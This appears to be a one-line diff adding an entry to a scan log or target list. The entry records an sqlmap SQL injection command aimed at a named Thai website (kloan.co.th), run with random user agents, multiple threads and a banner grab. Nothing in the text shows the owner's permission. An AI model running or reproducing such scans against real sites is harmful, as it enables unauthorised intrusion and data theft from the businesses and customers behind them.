@@ -1,0 +1,1 @@
+https://kloan.co.th (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://kloan.co.th -p id --batch --random-agent --level=2 --risk=1 --time-sec=20 --threads=2 --banner --output-dir=auto_local_sqlmap_20251029_163254
